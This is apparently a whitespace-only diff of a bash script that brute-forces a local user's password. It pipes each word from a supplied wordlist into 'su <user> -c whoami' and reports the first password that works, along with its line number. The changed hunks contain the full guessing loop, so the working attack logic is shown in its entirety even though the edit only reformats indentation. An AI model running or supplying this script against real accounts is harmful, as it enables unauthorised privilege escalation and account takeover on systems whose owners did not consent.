@@ -61,8 +61,8 @@ function info(){
 while getopts ":u:w:h:" arg; do
     case $arg in
         u) username=$OPTARG; let parameter_counter+=1 ;;
-	      w) wordlist=$OPTARG; let parameter_counter+=1 ;;
-	      h) help;;
+	w) wordlist=$OPTARG; let parameter_counter+=1 ;;
+	h) help;;
     esac
 done
 
@@ -88,18 +88,18 @@ regex="([0-9]+).$wordlist"
 siz="${BASH_REMATCH[1]}"
 
 while read password; do
-    line=$((line + 1))
-    progress=$((line * 100 / siz))
-    echo -ne "\r$YellowLight    $line/$siz ($progress%) ($password)       $End"
-    echo "$password" | timeout 0.1 bash -c "su $username -c whoami &>/dev/null"
-if [ $? -eq 0 ]; then
-    f1=$(/usr/bin/cat $wordlist | /usr/bin/grep "^$password$" -n | /usr/bin/cut -d: -f1)
-    echo -e "\n$GreenLight$var22 $Red$var15 $GreenLight$password$Red $var16 $GreenLight$f1"
-    echo -e "$White$var21$End"
-    echo ""
-    sleep 2
-    exit 0
-fi
+        line=$((line + 1))
+        progress=$((line * 100 / siz))
+        echo -ne "\r$YellowLight    $line/$siz ($progress%) ($password)       $End"
+        echo "$password" | timeout 0.1 bash -c "su $username -c whoami &>/dev/null"
+    if [ $? -eq 0 ]; then
+        f1=$(/usr/bin/cat $wordlist | /usr/bin/grep "^$password$" -n | /usr/bin/cut -d: -f1)
+        echo -e "\n$GreenLight$var22 $Red$var15 $GreenLight$password$Red $var16 $GreenLight$f1"
+        echo -e "$White$var21$End"
+        echo ""
+        sleep 2
+        exit 0
+    fi
 done < $wordlist
 echo -e "\r$Red$var24 $Red$var18 $White$var19$End"
 echo ""
